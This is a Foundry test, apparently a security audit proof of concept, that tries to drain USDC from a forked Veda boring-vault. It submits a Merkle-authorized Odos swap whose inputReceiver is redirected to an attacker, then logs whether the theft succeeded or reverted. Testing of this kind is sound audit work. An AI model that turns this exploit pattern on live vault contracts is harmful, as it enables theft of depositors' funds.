// ─────────────────────────────────────────────────────────────────────────────
// DROP-IN PoC — add this function inside the existing `OdosIntegrationTest`
// contract in test/integrations/OdosIntegration.t.sol (reuses its forked setUp,
// state vars, and MerkleTreeHelper). Scoped with {} blocks so it compiles WITHOUT
// --via-ir. Then run (from the Veda boring-vault repo, not native-token-transfers):
//
//   export MAINNET_RPC_URL=<archive RPC>        # Alchemy/Infura free tier works
//   forge test --match-test test_PoC_inputReceiverDrain -vvv --skip '*.s.sol'
//
// Builds the protocol's OWN honest leaf set (inputReceiver NOT bound), then submits
// a swap whose only changes are inputReceiver=attacker, inputAmount=0 (sweep),
// outputMin=1. The >>> RESULT line prints DRAIN SUCCEEDED or REVERTED.
// ─────────────────────────────────────────────────────────────────────────────
function test_PoC_inputReceiverDrain() external {
    _setUpSpecificBlock__USDCSwap();

    address usdc = getAddress(sourceChain, "USDC");
    address attacker = makeAddr("attacker");
    deal(usdc, address(boringVault), 1_000_000e6);

    // Build the protocol's OWN honest leaf set (inputReceiver is NOT a bound arg),
    // set it as the root, and capture the proofs. Scoped so intermediates free the stack.
    bytes32[][] memory manageProofs;
    {
        address[] memory tokens = new address[](3);
        SwapKind[] memory kind = new SwapKind[](3);
        tokens[0] = usdc;                                kind[0] = SwapKind.BuyAndSell;
        tokens[1] = getAddress(sourceChain, "WETH");     kind[1] = SwapKind.BuyAndSell;
        tokens[2] = getAddress(sourceChain, "USDT");     kind[2] = SwapKind.BuyAndSell;

        ManageLeaf[] memory leafs = new ManageLeaf[](16);
        _addOdosSwapLeafs(leafs, tokens, kind);
        bytes32[][] memory manageTree = _generateMerkleTree(leafs);
        manager.setManageRoot(address(this), manageTree[manageTree.length - 1][0]);

        ManageLeaf[] memory manageLeafs = new ManageLeaf[](2);
        manageLeafs[0] = leafs[0]; // approve USDC -> router
        manageLeafs[1] = leafs[1]; // swap() USDC->WETH  (honest leaf; inputReceiver not bound)
        manageProofs = _getProofsUsingTree(manageLeafs, manageTree);
    }

    address[] memory targets = new address[](2);
    bytes[] memory targetData = new bytes[](2);
    address[] memory decodersAndSanitizers = new address[](2);
    uint256[] memory values = new uint256[](2);
    {
        targets[0] = usdc;
        targets[1] = getAddress(sourceChain, "odosRouterV2");

        targetData[0] = abi.encodeWithSignature(
            "approve(address,uint256)", getAddress(sourceChain, "odosRouterV2"), type(uint256).max
        );

        // THE ONLY MALICIOUS CHANGES: inputReceiver=attacker, inputAmount=0 (sweep), outputMin=1.
        DecoderCustomTypes.swapTokenInfo memory s = DecoderCustomTypes.swapTokenInfo({
            inputToken: usdc,
            inputAmount: 0,
            inputReceiver: attacker,
            outputToken: getAddress(sourceChain, "WETH"),
            outputQuote: 1,
            outputMin: 1,
            outputReceiver: address(boringVault)
        });
        targetData[1] = abi.encodeWithSignature(
            "swap((address,uint256,address,address,uint256,uint256,address),bytes,address,uint32)",
            s,
            hex"010203000d0101010201ff00000000000000000000000000000000000000000088e6a0c2ddd26feeb64f039a2c41296fcb3f5640a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000",
            getAddress(sourceChain, "odosExecutor"),
            uint32(0)
        );

        decodersAndSanitizers[0] = rawDataDecoderAndSanitizer;
        decodersAndSanitizers[1] = rawDataDecoderAndSanitizer;
    }

    uint256 vaultBefore = ERC20(usdc).balanceOf(address(boringVault));
    emit log_named_uint("vault USDC before   ", vaultBefore);

    try manager.manageVaultWithMerkleVerification(manageProofs, decodersAndSanitizers, targets, targetData, values) {
        emit log_named_uint("vault USDC after    ", ERC20(usdc).balanceOf(address(boringVault)));
        emit log_named_uint("attacker USDC after ", ERC20(usdc).balanceOf(attacker));
        if (vaultBefore > 0 && ERC20(usdc).balanceOf(attacker) >= vaultBefore) {
            emit log(">>> RESULT: DRAIN SUCCEEDED - unconstrained inputReceiver moved the vault's USDC to the attacker (Critical).");
        } else {
            emit log(">>> RESULT: call succeeded but vault NOT drained - inspect balances.");
        }
    } catch Error(string memory reason) {
        emit log_named_string(">>> RESULT: REVERTED - no theft. reason", reason);
        emit log("    slippage/router revert => merkle authorized the diverted-inputReceiver call, but the starved executor produced < outputMin, so the whole tx (incl. the sweep) reverts. Removal is effectively safe unless a pathDefinition can supply >= outputMin independently.");
    } catch (bytes memory lowLevel) {
        emit log_named_bytes(">>> RESULT: REVERTED (low-level) - no theft. data", lowLevel);
    }
}
